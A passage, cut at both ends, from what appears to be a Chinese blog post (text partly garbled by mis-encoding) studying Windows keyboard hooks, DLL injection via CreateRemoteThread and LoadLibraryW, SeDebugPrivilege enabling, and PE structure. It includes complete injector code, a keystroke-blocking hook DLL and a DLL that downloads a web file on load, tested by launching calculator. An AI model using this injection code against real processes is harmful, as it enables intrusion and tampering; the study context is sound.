APIè·å¾—hookstartå‡½æ•°çš„åœ°å€ï¼Œè¿™é‡Œç”¨äº†å¼ºåˆ¶ç±»å‹è½¬åŒ–ï¼Œstopåœ°å€ä¹Ÿæ˜¯ï¼Œå…·ä½“å†…å®¹éœ€è¦çœ‹dllçš„å®ç°ã€‚ä¼°è®¡æ‰€æœ‰çš„ç®€å•hookéƒ½æ˜¯è¿™æ ·å®ç°çš„ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;KeyHook#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME&quot;notepad.exe&quot;HINSTANCE g_hInstance &#x3D; NULL;HHOOK g_hHook &#x3D; NULL;HWND g_hWnd &#x3D; NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123;switch( dwReason )&#123;        case DLL_PROCESS_ATTACH:g_hInstance &#x3D; hinstDLL;break;        case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123;char szPath[MAX_PATH] &#x3D; &#123;0,&#125;;char *p &#x3D; NULL;if( nCode &gt;&#x3D; 0 )&#123;&#x2F;&#x2F; bit 31 : 0 &#x3D;&gt; press, 1 &#x3D;&gt; releaseif( !(lParam &amp; 0x80000000) )&#x2F;&#x2F;é‡Šæ”¾é”®ç›˜æŒ‰é”®æ—¶&#123;GetModuleFileNameA(NULL, szPath, MAX_PATH);p &#x3D; strrchr(szPath, &#39;\\&#39;);            &#x2F;&#x2F; æ¯”è¾ƒå½“å‰è¿›ç¨‹åç§°ï¼Œè‹¥ä¸ºnotepad.exeï¼Œåˆ™æ¶ˆæ¯ä¸ä¼šä¼ é€’ç»™åº”ç”¨ç¨‹åºï¼ˆæˆ–è€…ä¸‹ä¸€ä¸ªé’©å­ï¼‰if( !_stricmp(p + 1, DEF_PROCESS_NAME) )return 1;&#125;&#125;    &#x2F;&#x2F; å¦‚æœä¸æ˜¯notepad.exeï¼Œåˆ™è°ƒç”¨CallNextHookExå‡½æ•°ï¼Œå°†æ¶ˆæ¯ä¼ é€’ç»™åº”ç”¨ç¨‹åºreturn CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void HookStart()&#123;g_hHook &#x3D; SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);&#125;__declspec(dllexport) void HookStop()&#123;if( g_hHook )&#123;UnhookWindowsHookEx(g_hHook);g_hHook &#x3D; NULL;&#125;&#125;#ifdef __cplusplus&#125;#endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å®ç°äº†ä¸‰ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯dllmainå‡½æ•°ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯ä¸»è¦çš„hookå‡½æ•°ï¼Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯è°ƒç”¨çš„æ¥å£ï¼Œä»HookMainå¯çŸ¥ï¼Œhookæ˜¯ä»HookStartå¼€å§‹çš„ã€‚</p><p>äº†è§£åˆ°<code>SetWindowsHookEx</code>å‡½æ•°ï¼Œæ˜¯hookçš„å®‰è£…å‡½æ•°ï¼Œè¿™é‡Œå°±ä¸å¾—ä¸æä¸€ä¸‹hookåœ¨å†…å­˜ä¸­çš„å­˜åœ¨å½¢å¼äº†ã€‚</p><p><a href="https://www.cnblogs.com/rosesmall/p/3248300.html">https://www.cnblogs.com/rosesmall/p/3248300.html</a></p><p>æ¯ä¸€ä¸ªHookéƒ½æœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å…³è”çš„<a href="http://baike.baidu.com/view/159417.htm">æŒ‡é’ˆ</a>åˆ—è¡¨ï¼Œç§°ä¹‹ä¸ºé’©å­<a href="http://baike.baidu.com/view/549479.htm">é“¾è¡¨</a>ï¼Œç”±ç³»ç»Ÿæ¥ç»´æŠ¤ã€‚è¿™ä¸ªåˆ—è¡¨çš„<a href="http://baike.baidu.com/view/159417.htm">æŒ‡é’ˆ</a>æŒ‡å‘æŒ‡å®šçš„ï¼Œåº”ç”¨ç¨‹åºå®šä¹‰çš„ï¼Œè¢«Hookå­ç¨‹è°ƒç”¨çš„<a href="http://baike.baidu.com/view/414773.htm">å›è°ƒå‡½æ•°</a>ï¼Œä¹Ÿå°±æ˜¯è¯¥é’©å­çš„å„ä¸ªå¤„ç†å­ç¨‹ã€‚å½“ä¸æŒ‡å®šçš„Hookç±»å‹å…³è”çš„æ¶ˆæ¯å‘ç”Ÿæ—¶ï¼Œç³»ç»Ÿå°±æŠŠè¿™ä¸ªæ¶ˆæ¯ä¼ é€’åˆ°Hookå­ç¨‹ã€‚ ä¸€äº›Hookå­ç¨‹å¯ä»¥åªç›‘è§†æ¶ˆæ¯ï¼Œæˆ–è€…ä¿®æ”¹æ¶ˆæ¯ï¼Œæˆ–è€…åœæ­¢æ¶ˆæ¯çš„å‰è¿›ï¼Œé¿å…è¿™äº›æ¶ˆæ¯ä¼ é€’åˆ°ä¸‹ä¸€ä¸ªHookå­ç¨‹æˆ–è€…ç›®çš„çª—å£ã€‚æœ€åå®‰è£…çš„é’©å­æ”¾åœ¨é“¾çš„å¼€å§‹ï¼Œ è€Œæœ€æ—©å®‰è£…çš„é’©å­æ”¾åœ¨æœ€åï¼Œä¹Ÿå°±æ˜¯ååŠ å…¥çš„å…ˆè·å¾—æ§åˆ¶æƒã€‚</p><p>Windows å¹¶ä¸è¦æ±‚é’©å­å­ç¨‹çš„<a href="http://baike.baidu.com/view/386432.htm">å¸è½½</a>é¡ºåºä¸€å®šå¾—å’Œå®‰è£…é¡ºåºç›¸åã€‚æ¯å½“æœ‰ä¸€ä¸ªé’©å­è¢«<a href="http://baike.baidu.com/view/386432.htm">å¸è½½</a>ï¼ŒWindows ä¾¿é‡Šæ”¾å…¶å ç”¨çš„å†…å­˜ï¼Œå¹¶æ›´æ–°æ•´ä¸ªHooké“¾è¡¨ã€‚å¦‚æœç¨‹åºå®‰è£…äº†é’©å­ï¼Œä½†æ˜¯åœ¨å°šæœª<a href="http://baike.baidu.com/view/386432.htm">å¸è½½</a>é’©å­ä¹‹å‰å°±ç»“æŸäº†ï¼Œé‚£ä¹ˆç³»ç»Ÿä¼šè‡ªåŠ¨ä¸ºå®ƒåšå¸è½½é’©å­çš„æ“ä½œã€‚</p><p>SetWindowsHookExå‡½æ•°æ€»ä¼šåœ¨hooké“¾çš„å¼€å¤´å®‰è£…hookå­ç¨‹ã€‚å½“æŒ‡å®šç±»å‹çš„Hookç›‘è§†çš„äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œç³»ç»Ÿå°±è°ƒç”¨ä¸è¿™ä¸ªHookå…³è”çš„ Hooké“¾çš„å¼€å¤´çš„Hookå­ç¨‹ã€‚æ¯ä¸€ä¸ªHooké“¾ä¸­çš„Hookå­ç¨‹éƒ½å†³å®šæ˜¯å¦æŠŠè¿™ä¸ªäº‹ä»¶ä¼ é€’åˆ°ä¸‹ä¸€ä¸ªHookå­ç¨‹ã€‚Hookå­ç¨‹ä¼ é€’äº‹ä»¶åˆ°ä¸‹ä¸€ä¸ª Hookå­ç¨‹éœ€è¦è°ƒç”¨CallNextHookExå‡½æ•°ã€‚</p><p>å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">HHOOK SetWindowsHookEx(int idHook, &#x2F;&#x2F; é’©å­çš„ç±»å‹ï¼Œå³å®ƒå¤„ç†çš„æ¶ˆæ¯ç±»å‹HOOKPROC lpfn, &#x2F;&#x2F; é’©å­å­ç¨‹çš„åœ°å€æŒ‡é’ˆã€‚å¦‚æœdwThreadIdå‚æ•°ä¸º0&#x2F;&#x2F; æˆ–æ˜¯ä¸€ä¸ªç”±åˆ«çš„è¿›ç¨‹åˆ›å»ºçš„çº¿ç¨‹çš„æ ‡è¯†ï¼Œ&#x2F;&#x2F; lpfnå¿…é¡»æŒ‡å‘DLLä¸­çš„é’©å­å­ç¨‹ã€‚&#x2F;&#x2F; é™¤æ­¤ä»¥å¤–ï¼Œlpfnå¯ä»¥æŒ‡å‘å½“å‰è¿›ç¨‹çš„ä¸€æ®µé’©å­å­ç¨‹ä»£ç ã€‚&#x2F;&#x2F; é’©å­å‡½æ•°çš„å…¥å£åœ°å€ï¼Œå½“é’©å­é’©åˆ°ä»»ä½•æ¶ˆæ¯åä¾¿è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚HINSTANCE hMod, &#x2F;&#x2F; åº”ç”¨ç¨‹åºå®ä¾‹çš„å¥æŸ„ã€‚æ ‡è¯†åŒ…å«lpfnæ‰€æŒ‡çš„å­ç¨‹çš„DLLã€‚&#x2F;&#x2F; å¦‚æœdwThreadId æ ‡è¯†å½“å‰è¿›ç¨‹åˆ›å»ºçš„ä¸€ä¸ªçº¿ç¨‹ï¼Œ&#x2F;&#x2F; è€Œä¸”å­ç¨‹ä»£ç ä½äºå½“å‰è¿›ç¨‹ï¼ŒhModå¿…é¡»ä¸ºNULLã€‚&#x2F;&#x2F; å¯ä»¥å¾ˆç®€å•çš„è®¾å®šå…¶ä¸ºæœ¬åº”ç”¨ç¨‹åºçš„å®ä¾‹å¥æŸ„ã€‚DWORD dwThreadId &#x2F;&#x2F; ä¸å®‰è£…çš„é’©å­å­ç¨‹ç›¸å…³è”çš„çº¿ç¨‹çš„æ ‡è¯†ç¬¦ã€‚&#x2F;&#x2F; å¦‚æœä¸º0ï¼Œé’©å­å­ç¨‹ä¸æ‰€æœ‰çš„çº¿ç¨‹å…³è”ï¼Œå³ä¸ºå…¨å±€é’©å­ã€‚);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>æŠŠæˆ‘ä»¬åˆ›å»ºçš„é’©å­å‡½æ•°ä½œä¸ºå…¥å£åœ°å€ï¼Œé’©åˆ°æ¶ˆæ¯å³ä¼ é€’ç»™è¯¥å‡½æ•°ã€‚è€Œhookå‡½æ•°å°±æ˜¯ç®€å•çš„ï¼ŒåŠ«æŒnotepadçš„æ¶ˆæ¯ï¼Œä¸å¾€ä¸‹ä¼ é€’ï¼Œè¿™å°±å¯¼è‡´äº†notepadçš„è¿›ç¨‹æŒ‰é”®æ— æ³•è¢«æ­£ç¡®å“åº”ã€‚å®ç°äº†hookã€‚</p><h3 id="dllæ³¨å…¥ä»£ç åˆ†æ"><a class="header-anchor" href="#dllæ³¨å…¥ä»£ç åˆ†æ">Â¶</a>dllæ³¨å…¥ä»£ç åˆ†æ</h3><p>è¿˜æ˜¯çœ‹åˆ°æ³¨å…¥ä»£ç ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;#include &quot;tchar.h&quot;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,               &amp;hToken) )    &#123;        _tprintf(L&quot;OpenProcessToken error: %u\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,           &#x2F;&#x2F; lookup privilege on local system                              lpszPrivilege,  &#x2F;&#x2F; privilege to lookup                               &amp;luid) )        &#x2F;&#x2F; receives LUID of privilege    &#123;        _tprintf(L&quot;LookupPrivilegeValue error: %u\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount &#x3D; 1;    tp.Privileges[0].Luid &#x3D; luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes &#x3D; 0;    &#x2F;&#x2F; Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         _tprintf(L&quot;AdjustTokenPrivileges error: %u\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED )    &#123;        _tprintf(L&quot;The token does not have the specified privilege. \n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;    HANDLE hProcess &#x3D; NULL, hThread &#x3D; NULL;    HMODULE hMod &#x3D; NULL;    LPVOID pRemoteBuf &#x3D; NULL;    DWORD dwBufSize &#x3D; (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);    LPTHREAD_START_ROUTINE pThreadProc;    &#x2F;&#x2F; #1. dwPID notepad.exe    if ( !(hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )    &#123;        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());        return FALSE;    &#125;    &#x2F;&#x2F; #2.åˆ†é…ä¸€å—å†…å­˜åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ï¼Œç”¨æ¥å­˜å‚¨dllçš„è·¯å¾„ï¼Œè®¾ç½®æƒé™ä¸ºè¯»å†™ã€‚    pRemoteBuf &#x3D; VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);    &#x2F;&#x2F; #3. å†™å…¥è·¯å¾„    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);    &#x2F;&#x2F; #4. LoadLibraryA() API     hMod &#x3D; GetModuleHandle(L&quot;kernel32.dll&quot;);    pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);    &#x2F;&#x2F; #5. notepad.exe     hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);    WaitForSingleObject(hThread, INFINITE);    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;&#125;int _tmain(int argc, TCHAR *argv[])&#123;    if( argc !&#x3D; 3)    &#123;        _tprintf(L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;, argv[0]);        return 1;    &#125;    &#x2F;&#x2F; change privilege    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )        return 1;    &#x2F;&#x2F; inject dll    if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) )        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;, argv[2]);    else        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;, argv[2]);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>çœ‹mainå‡½æ•°çš„usageå°±çŸ¥é“è¿™æ˜¯ä¸€ä¸ªå¯¹æŒ‡å®špidæ³¨å…¥æŒ‡å®šdllçš„ç¨‹åºã€‚</p><p>é‡ç‚¹çœ‹åˆ°injectdllå‡½æ•°ï¼Œ<code>SetPrivilege</code>è¢«ç”¨æ¥è®¾å®šæƒé™ã€‚</p><p><code>pRemoteBuf =  VirtualAllocEx(hProcess,NULL,dwBufSize,MEM_COMMIT,PAGE_READWRITE)</code>å°†è¦æ³¨å…¥çš„dllè·¯å¾„å†™å…¥ç›®æ ‡è¿›ç¨‹å†…å­˜ã€‚å› ä¸ºä»»ä½•å†…å­˜ç©ºé—´éƒ½æ— æ³•å†™å…¥ï¼Œæ‰€ä»¥è°ƒç”¨<code>VirtualAllocExï¼ˆï¼‰</code>åœ¨ç›®æ ‡è¿›ç¨‹åˆ†é…ä¸€å—ç¼“å†²åŒºï¼ŒæŒ‡å®šç¼“å†²åŒºå¤§å°ä¸ºdllæ–‡ä»¶è·¯å¾„é•¿åº¦ã€‚åŒæ—¶è®¾å®šæƒé™ä¸ºè¯»å†™ã€‚</p><p>å†™å…¥è·¯å¾„ä¹‹åï¼Œè°ƒç”¨äº†çº¿ç¨‹å‡½æ•°<code>hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);</code>åˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œçº¿ç¨‹å±äºpProcessï¼Œè¿˜æœ‰ä¸€äº›å‚æ•°ï¼ŒLoadLibraryWçš„åœ°å€å’Œdllè·¯å¾„çš„åœ°å€ã€‚</p><p>çœ‹åˆ°dllä»£ç </p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#pragma comment(lib, &quot;urlmon.lib&quot;)#define DEF_URL     (L&quot;http:&#x2F;&#x2F;www.naver.com&#x2F;index.html&quot;)#define DEF_FILE_NAME   (L&quot;index.html&quot;)HMODULE g_hMod &#x3D; NULL;DWORD WINAPI ThreadProc(LPVOID lParam)&#123;    TCHAR szPath[_MAX_PATH] &#x3D; &#123;0,&#125;;    if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )        return FALSE;    TCHAR *p &#x3D; _tcsrchr( szPath, &#39;\\&#39; );    if( !p )        return FALSE;    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);    URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL);    return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    HANDLE hThread &#x3D; NULL;    g_hMod &#x3D; (HMODULE)hinstDLL;    switch( fdwReason )    &#123;    case DLL_PROCESS_ATTACH :         OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;);        hThread &#x3D; CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);        CloseHandle(hThread);        break;    &#125;    return TRUE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>è¿™ä¸ªå°±æ¯”è¾ƒç®€å•äº†ï¼Œæ„æ€å°±æ˜¯è°ƒç”¨æŒ‡å®šçš„APIä¸‹è½½æŒ‡å®šçš„æ–‡ä»¶åˆ°æŒ‡å®šçš„åœ°ç‚¹ã€‚</p><p>ç»¼ä¸Šï¼šæ³¨å…¥çš„mainå‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹åŠ è½½æŒ‡å®šè·¯å¾„çš„dllï¼Œè€Œè¯¥dllå®ç°è¿œç¨‹ä¸‹è½½çš„åŠŸèƒ½ã€‚</p><p>è¿™é‡Œåˆ©ç”¨äº†ä¸€ä¸ªWindows osä¸‹çš„ç‰¹æ€§ï¼Œç”±äºè¦ä½¿å¾—æŒ‡å®šçš„çº¿ç¨‹åŠ è½½ï¼Œåˆ™éœ€è¦çŸ¥é“ç›®æ ‡çº¿ç¨‹çš„APIå‡½æ•°åœ°å€ï¼Œä½†æ˜¯åœ¨Windowsä¸­ï¼Œå› ä¸ºOSæ ¸å¿ƒdllä¼šè¢«åŠ è½½åˆ°è‡ªèº«å›ºå®šçš„åœ°å€ï¼Œdllæ³¨å…¥åˆ©ç”¨çš„å°±æ˜¯window OSçš„è¿™ä¸€ç‰¹æ€§ã€‚æ‰€ä»¥ï¼Œå¯¼å…¥InjectDll.exeè¿›ç¨‹ä¸­çš„LoadLibraryWï¼ˆï¼‰åœ°å€ä¸å¯¼å…¥notepad.exeè¿›ç¨‹ä¸­çš„LoadLibraryWï¼ˆï¼‰åœ°å€æ˜¯ç›¸åŒçš„ã€‚</p><h2 id="0x03-å®è·µ"><a class="header-anchor" href="#0x03-å®è·µ">Â¶</a>0x03 å®è·µ</h2><h3 id="hookå®è·µ"><a class="header-anchor" href="#hookå®è·µ">Â¶</a>hookå®è·µ</h3><p>è¿™é‡Œçœ‹åˆ°å“åº”å‡½æ•°ï¼Œæ›´æ”¹ä¸ºå¦‚ä¸‹:</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/d8020a30306069b8.png" alt=""></p><p>å¼¹å‡ºè®¡ç®—å™¨å¯èƒ½æ•ˆæœæ›´åŠ ç›´è§‚ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/a05ba7f4c9734402.png" alt=""></p><p>è¿›ç¨‹åå­—æ”¹ä¸ºnotepad++.exeï¼Œç„¶åä½¿ç”¨g++ç¼–è¯‘ä»£ç ã€‚</p><p><code> g++ --share ai.cpp -o ai.dll</code></p><p>ç¼–è¯‘å®Œæ¯•ä¹‹åï¼ŒæŠŠdllå’Œexeæ”¾åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶åè¿è¡Œexe</p><p><a href="https://imgtu.com/i/jeNzFS"><img src="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg" alt="jeNzFS.jpg"></a></p><p>hookæˆåŠŸ</p><h3 id="dllå®è·µ"><a class="header-anchor" href="#dllå®è·µ">Â¶</a>dllå®è·µ</h3><p>åŒæ ·çš„æ–¹å¼ï¼Œç¼–è¯‘ä»£ç ï¼Œæ³¨æ„ä¿®æ”¹ï¼Œä½¿å¾—å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/5ca74cf4d01afec0.png" alt=""></p><p>ä½†æ˜¯è¿™è¾¹ç¼–è¯‘ä»£ç çš„æ—¶å€™å‡ºäº†å¾ˆå¤šé—®é¢˜ï¼Œäºæ˜¯æŠŠ_tprintfå…¨éƒ¨æ›¿æ¢æˆäº†printfï¼Œä¸”æ‰€æœ‰å­—ç¬¦ä¸²å»æ‰äº†Lå‰ç¼€ã€‚</p><p>æŒ‰é“ç†æ¥è®²_tprintfä¸åº”è¯¥æŠ¥é”™æ‰å¯¹ã€‚</p><p>ä¹‹åæ‰“å¼€notepad æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹å·ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/c79a29b29937d691.png" alt=""></p><p>è¿è¡Œå†Œç¨‹åºæ³¨å…¥dllã€‚æ”¹ä¸€ä¸‹ä»£ç </p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/d90a487ccffa6fab.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/f4bb4a0ecd50f354.png" alt=""></p><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h2 id="0x04-dllæ³¨å…¥å®ç°ææƒ"><a class="header-anchor" href="#0x04-dllæ³¨å…¥å®ç°ææƒ">Â¶</a>0x04 dllæ³¨å…¥å®ç°ææƒ</h2><p>å‰é¢çœ‹dllæ³¨å…¥ä»£ç çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªææƒå‡½æ•°ã€‚è¿™é‡Œåˆ†æä¸€ä¸‹</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/059bd42051f18c03.png" alt=""></p><p>é¦–å…ˆæ‰“å¼€å½“å‰è¿›ç¨‹çš„ä»¤ç‰Œï¼Œå­˜å‚¨åœ¨hTokenä¸­ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/43e0fa220e4b1b89.png" alt=""></p><p>æŸ¥çœ‹ç›®æ ‡æƒé™çš„ä¸Šä¸‹æ–‡ï¼Œå­˜å‚¨åˆ°luidä¸­ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/f7e7c258d9847390.png" alt=""></p><p>ç”¨æ–°å»ºçš„tpå¯¹è±¡æ›¿æ¢åŸæ¥çš„è¿›ç¨‹ä»¤ç‰Œå®ç°æƒé™çš„å˜åŒ–ã€‚</p><h2 id="0x05-PEæ³¨å…¥"><a class="header-anchor" href="#0x05-PEæ³¨å…¥">Â¶</a>0x05 PEæ³¨å…¥</h2><p><a href="https://blog.csdn.net/freeking101/article/details/102752048">https://blog.csdn.net/freeking101/article/details/102752048</a></p><p>è¯¥æ–‡ç« å¯¹PEç»“æ„è®²è§£ååˆ†è¯¦ç»†ã€‚</p><p>PEï¼ˆ Portable Executeï¼‰æ–‡ä»¶æ˜¯Windowsä¸‹å¯æ‰§è¡Œæ–‡ä»¶çš„æ€»ç§°ï¼Œå¸¸è§çš„æœ‰ <strong>DLLï¼ŒEXEï¼ŒOCXï¼ŒSYS</strong> ç­‰ã€‚å®ƒæ˜¯å¾®è½¯åœ¨ UNIX å¹³å°çš„ COFFï¼ˆé€šç”¨å¯¹è±¡æ–‡ä»¶æ ¼å¼ï¼‰åŸºç¡€ä¸Šåˆ¶ä½œè€Œæˆã€‚<strong>æœ€åˆè®¾è®¡ç”¨æ¥æé«˜ç¨‹åºåœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸Šçš„ç§»æ¤æ€§ï¼Œä½†å®é™…ä¸Šè¿™ç§æ–‡ä»¶æ ¼å¼ä»…ç”¨åœ¨ Windows ç³»åˆ—æ“ä½œç³»ç»Ÿä¸‹</strong>ã€‚<strong>PEæ–‡ä»¶æ˜¯æŒ‡ 32 ä½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿç§°ä¸ºPE32ã€‚64ä½çš„å¯æ‰§è¡Œæ–‡ä»¶ç§°ä¸º PE+ æˆ– PE32+ï¼Œæ˜¯PE(PE32)çš„ä¸€ç§æ‰©å±•å½¢å¼ï¼ˆè¯·æ³¨æ„ä¸æ˜¯PE64)</strong>ã€‚</p><p>PEæ–‡ä»¶çš„æ ¼å¼å¦‚ä¸‹</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/3e5c77288fe4c891.png" alt=""></p><p>PEæ–‡ä»¶åŠ è½½çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>æ£€æŸ¥Dos headeré‡Œé¢çš„PE headeråç§»ï¼Œç„¶åç›´æ¥è·³è½¬åˆ°header</li><li>æ£€æŸ¥headeræ˜¯å¦åˆæ³•ï¼Œå¦‚æœåˆæ³•åˆ™è·³è½¬åˆ°headerçš„å°¾éƒ¨</li><li>headerçš„å°¾éƒ¨æ˜¯èŠ‚è¡¨ï¼Œæ­¤æ—¶PEè£…è½½å™¨ä¼šè¯»å–èŠ‚è¡¨çš„ä¿¡æ¯ï¼Œç„¶åæ˜ å°„å†…å­˜ï¼ˆè™šå­˜ç›¸å…³ï¼Œæ“ä½œç³»ç»Ÿè®²è¿‡ï¼‰</li><li>æ˜ å°„å®Œæ¯•ä¹‹åï¼Œå¼€å§‹å¤„ç†è¾“å…¥è¡¨çš„é€»è¾‘éƒ¨åˆ†</li></ul><p>æ³¨æ„åˆ°æ–‡ä»¶ä¸­çš„èŠ‚è¡¨å’ŒèŠ‚</p><p><strong>èŠ‚è¡¨</strong>ï¼šæ˜¯ PE æ–‡ä»¶åç»­èŠ‚çš„æè¿°ï¼Œwindows æ ¹æ®èŠ‚è¡¨çš„æè¿°åŠ è½½æ¯ä¸ªèŠ‚ã€‚</p><p><strong>èŠ‚</strong>ï¼šæ¯ä¸ªèŠ‚å®é™…ä¸Šæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå¯ä»¥åŒ…å« ä»£ç ã€æ•°æ® ç­‰ç­‰ï¼Œæ¯ä¸ªèŠ‚å¯ä»¥æœ‰ç‹¬ç«‹çš„å†…å­˜æƒé™ï¼Œæ¯”å¦‚ä»£ç èŠ‚é»˜è®¤æœ‰è¯»/æ‰§è¡Œæƒé™ï¼ŒèŠ‚çš„åå­—å’Œæ•°é‡å¯ä»¥è‡ªå·±å®šä¹‰ï¼Œæœªå¿…æ˜¯ä¸Šå›¾ä¸­çš„ä¸‰ä¸ª</p><p>**å¯¼å‡ºè¡¨ <strong>æ˜¯ ç”¨æ¥æè¿° 